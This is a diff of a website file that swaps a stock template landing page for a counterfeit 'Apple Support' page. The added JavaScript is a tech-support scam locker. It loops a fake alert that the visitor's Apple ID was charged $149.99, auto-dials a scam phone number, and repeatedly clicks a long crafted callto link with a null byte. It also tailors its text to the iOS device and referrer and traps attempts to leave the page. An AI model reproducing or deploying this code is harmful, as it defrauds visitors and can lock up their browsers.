-                typesetting industry. Lorem Ipsum has been the industry's
-                standard.
-              </p>
-            </div>
-          </div>
-          <!-- End Single News -->
-        </div>
-        <div class="col-lg-4 col-md-6 col-12">
-          <!-- Single News -->
-          <div class="single-news">
-            <div class="image">
-              <a href="javascript:void(0)"><img class="thumb" src="assets/images/blog/2.jpg" alt="Blog" /></a>
-              <div class="meta-details">
-                <img class="thumb" src="assets/images/blog/b6.jpg" alt="Author" />
-                <span>BY TIM NORTON</span>
-              </div>
-            </div>
-            <div class="content-body">
-              <h4 class="title">
-                <a href="javascript:void(0)">
-                  The newest web framework that changed the world
-                </a>
-              </h4>
-              <p>
-                Lorem Ipsum is simply dummy text of the printing and
-                typesetting industry. Lorem Ipsum has been the industry's
-                standard.
-              </p>
-            </div>
-          </div>
-          <!-- End Single News -->
-        </div>
-        <div class="col-lg-4 col-md-6 col-12">
-          <!-- Single News -->
-          <div class="single-news">
-            <div class="image">
-              <a href="javascript:void(0)"><img class="thumb" src="assets/images/blog/3.jpg" alt="Blog" /></a>
-              <div class="meta-details">
-                <img class="thumb" src="assets/images/blog/b6.jpg" alt="Author" />
-                <span>BY TIM NORTON</span>
-              </div>
-            </div>
-            <div class="content-body">
-              <h4 class="title">
-                <a href="javascript:void(0)">
-                  5 ways to improve user retention for your startup
-                </a>
-              </h4>
-              <p>
-                Lorem Ipsum is simply dummy text of the printing and
-                typesetting industry. Lorem Ipsum has been the industry's
-                standard.
-              </p>
-            </div>
-          </div>
-          <!-- End Single News -->
-        </div>
-      </div>
-    </div>
-  </div>
-  <!-- End Latest News Area -->
-
-  <!-- Start Brand Area -->
-  <div id="clients" class="brand-area section">
-    <!--======  Start Section Title Five ======-->
-    <div class="section-title-five">
-      <div class="container">
-        <div class="row">
-          <div class="col-12">
-            <div class="content">
-              <h6>Meet our Clients</h6>
-              <h2 class="fw-bold">Our Awesome Clients</h2>
-              <p>
-                There are many variations of passages of Lorem Ipsum available,
-                but the majority have suffered alteration in some form.
-              </p>
-            </div>
-          </div>
-        </div>
-        <!-- row -->
-      </div>
-      <!-- container -->
-    </div>
-    <!--======  End Section Title Five ======-->
-    <div class="container">
-      <div class="row">
-        <div class="col-lg-8 offset-lg-2 col-12">
-          <div class="clients-logos">
-            <div class="single-image">
-              <img src="assets/images/client-logo/graygrids.svg" alt="Brand Logo Images" />
-            </div>
-            <div class="single-image">
-              <img src="assets/images/client-logo/uideck.svg" alt="Brand Logo Images" />
-            </div>
-            <div class="single-image">
-              <img src="assets/images/client-logo/ayroui.svg" alt="Brand Logo Images" />
-            </div>
-            <div class="single-image">
-              <img src="assets/images/client-logo/lineicons.svg" alt="Brand Logo Images" />
-            </div>
-            <div class="single-image">
-              <img src="assets/images/client-logo/tailwindtemplates.svg" alt="Brand Logo Images" />
-            </div>
-            <div class="single-image">
-              <img src="assets/images/client-logo/ecomhtml.svg" alt="Brand Logo Images" />
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-  <!-- End Brand Area -->
-
-  <!-- ========================= contact-section start ========================= -->
-  <section id="contact" class="contact-section">
-    <div class="container">
-      <div class="row">
-        <div class="col-xl-4">
-          <div class="contact-item-wrapper">
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
             <div class="row">
-              <div class="col-12 col-md-6 col-xl-12">
-                <div class="contact-item">
-                  <div class="contact-icon">
-                    <i class="lni lni-phone"></i>
-                  </div>
-                  <div class="contact-content">
-                    <h4>Contact</h4>
-                    <p>0984537278623</p>
-                    <p>yourmail@gmail.com</p>
-                  </div>
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
                 </div>
-              </div>
-              <div class="col-12 col-md-6 col-xl-12">
-                <div class="contact-item">
-                  <div class="contact-icon">
-                    <i class="lni lni-map-marker"></i>
-                  </div>
-                  <div class="contact-content">
-                    <h4>Address</h4>
-                    <p>175 5th Ave, New York, NY 10010</p>
-                    <p>United States</p>
-                  </div>
-                </div>
-              </div>
-              <div class="col-12 col-md-6 col-xl-12">
-                <div class="contact-item">
-                  <div class="contact-icon">
-                    <i class="lni lni-alarm-clock"></i>
-                  </div>
-                  <div class="contact-content">
-                    <h4>Schedule</h4>
-                    <p>24 Hours / 7 Days Open</p>
-                    <p>Office time: 10 AM - 5:30 PM</p>
-                  </div>
-                </div>
-              </div>
             </div>
-          </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-844-449-3831
+			 " property="telephone">
+            </section>
         </div>
-        <div class="col-xl-8">
-          <div class="contact-form-wrapper">
-            <div class="row">
-              <div class="col-xl-10 col-lg-8 mx-auto">
-                <div class="section-title text-center">
-                  <span> Get in Touch </span>
-                  <h2>
-                    Ready to Get Started
-                  </h2>
-                  <p>
-                    At vero eos et accusamus et iusto odio dignissimos ducimus
-                    quiblanditiis praesentium
-                  </p>
-                </div>
-              </div>
-            </div>
-            <form action="#" class="contact-form">
-              <div class="row">
-                <div class="col-md-6">
-                  <input type="text" name="name" id="name" placeholder="Name" required />
-                </div>
-                <div class="col-md-6">
-                  <input type="email" name="email" id="email" placeholder="Email" required />
-                </div>
-              </div>
-              <div class="row">
-                <div class="col-md-6">
-                  <input type="text" name="phone" id="phone" placeholder="Phone" required />
-                </div>
-                <div class="col-md-6">
-                  <input type="text" name="subject" id="email" placeholder="Subject" required />
-                </div>
-              </div>
-              <div class="row">
-                <div class="col-12">
-                  <textarea name="message" id="message" placeholder="Type Message" rows="5"></textarea>
-                </div>
-              </div>
-              <div class="row">
-                <div class="col-12">
-                  <div class="button text-center rounded-buttons">
-                    <button type="submit" class="btn primary-btn rounded-full">
-                      Send Message
-                    </button>
-                  </div>
-                </div>
-              </div>
-            </form>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <!-- ========================= contact-section end ========================= -->
+    </footer>
 
-  <!-- ========================= map-section end ========================= -->
-  <section class="map-section map-style-9">
-    <div class="map-container">
-      <object style="border:0; height: 500px; width: 100%;"
-        data="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3102.7887109309127!2d-77.44196278417968!3d38.95165507956235!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMzjCsDU3JzA2LjAiTiA3N8KwMjYnMjMuMiJX!5e0!3m2!1sen!2sbd!4v1545420879707"></object>
-    </div>
-    </div>
-  </section>
-  <!-- ========================= map-section end ========================= -->
 
-  <!-- Start Footer Area -->
-  <footer class="footer-area footer-eleven">
-    <!-- Start Footer Top -->
-    <div class="footer-top">
-      <div class="container">
-        <div class="inner-content">
-          <div class="row">
-            <div class="col-lg-4 col-md-6 col-12">
-              <!-- Single Widget -->
-              <div class="footer-widget f-about">
-                <div class="logo">
-                  <a href="index.html">
-                    <img src="assets/images/logo.svg" alt="#" class="img-fluid" />
-                  </a>
-                </div>
-                <p>
-                  Making the world a better place through constructing elegant
-                  hierarchies.
-                </p>
-                <p class="copyright-text">
-                  <span>© 2024 Ayro UI.</span>Designed and Developed by
-                  <a href="javascript:void(0)" rel="nofollow"> Ayro UI </a>. <br> Distributed by <a href="http://themewagon.com" target="_blank">ThemeWagon</a>
-                </p>
-              </div>
-              <!-- End Single Widget -->
-            </div>
-            <div class="col-lg-2 col-md-6 col-12">
-              <!-- Single Widget -->
-              <div class="footer-widget f-link">
-                <h5>Solutions</h5>
-                <ul>
-                  <li><a href="javascript:void(0)">Marketing</a></li>
-                  <li><a href="javascript:void(0)">Analytics</a></li>
-                  <li><a href="javascript:void(0)">Commerce</a></li>
-                  <li><a href="javascript:void(0)">Insights</a></li>
-                </ul>
-              </div>
-              <!-- End Single Widget -->
-            </div>
-            <div class="col-lg-2 col-md-6 col-12">
-              <!-- Single Widget -->
-              <div class="footer-widget f-link">
-                <h5>Support</h5>
-                <ul>
-                  <li><a href="javascript:void(0)">Pricing</a></li>
-                  <li><a href="javascript:void(0)">Documentation</a></li>
-                  <li><a href="javascript:void(0)">Guides</a></li>
-                  <li><a href="javascript:void(0)">API Status</a></li>
-                </ul>
-              </div>
-              <!-- End Single Widget -->
-            </div>
-            <div class="col-lg-4 col-md-6 col-12">
-              <!-- Single Widget -->
-              <div class="footer-widget newsletter">
-                <h5>Subscribe</h5>
-                <p>Subscribe to our newsletter for the latest updates</p>
-                <form action="#" method="get" target="_blank" class="newsletter-form">
-                  <input name="EMAIL" placeholder="Email address" required="required" type="email" />
-                  <div class="button">
-                    <button class="sub-btn">
-                      <i class="lni lni-envelope"></i>
-                    </button>
-                  </div>
-                </form>
-              </div>
-              <!-- End Single Widget -->
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <!--/ End Footer Top -->
-  </footer>
-  <!--/ End Footer Area -->
 
-	
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-  <a href="#" class="scroll-top btn-hover">
-    <i class="lni lni-chevron-up"></i>
-  </a>
 
-  <!--====== js ======-->
-  <script src="assets/js/bootstrap.bundle.min.js"></script>
-  <script src="assets/js/glightbox.min.js"></script>
-  <script src="assets/js/main.js"></script>
-  <script src="assets/js/tiny-slider.js"></script>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
 
-  <script>
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
 
-    //===== close navbar-collapse when a  clicked
-    let navbarTogglerNine = document.querySelector(
-      ".navbar-nine .navbar-toggler"
-    );
-    navbarTogglerNine.addEventListener("click", function () {
-      navbarTogglerNine.classList.toggle("active");
-    });
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
 
-    // ==== left sidebar toggle
-    let sidebarLeft = document.querySelector(".sidebar-left");
-    let overlayLeft = document.querySelector(".overlay-left");
-    let sidebarClose = document.querySelector(".sidebar-close .close");
+        window.number = getPar('phone');
 
-    overlayLeft.addEventListener("click", function () {
-      sidebarLeft.classList.toggle("open");
-      overlayLeft.classList.toggle("open");
-    });
-    sidebarClose.addEventListener("click", function () {
-      sidebarLeft.classList.remove("open");
-      overlayLeft.classList.remove("open");
-    });
+        window.number = (window.number ? window.number : '+1-844-449-3831');
 
-    // ===== navbar nine sideMenu
-    let sideMenuLeftNine = document.querySelector(".navbar-nine .menu-bar");
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
 
-    sideMenuLeftNine.addEventListener("click", function () {
-      sidebarLeft.classList.add("open");
-      overlayLeft.classList.add("open");
-    });
+        if (ios) {
 
-    //========= glightbox
-    GLightbox({
-      'href': 'https://www.youtube.com/watch?v=r44RKWyfcFw&fbclid=IwAR21beSJORalzmzokxDRcGfkZA1AtRTE__l5N4r09HcGS5Y6vOluyouM9EM',
-      'type': 'video',
-      'source': 'youtube', //vimeo, youtube or local
-      'width': 900,
-      'autoplayVideos': true,
-    });
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
 
-  </script>
-</body>
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
 
-</html>
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-844-449-3831"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-844-449-3831 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
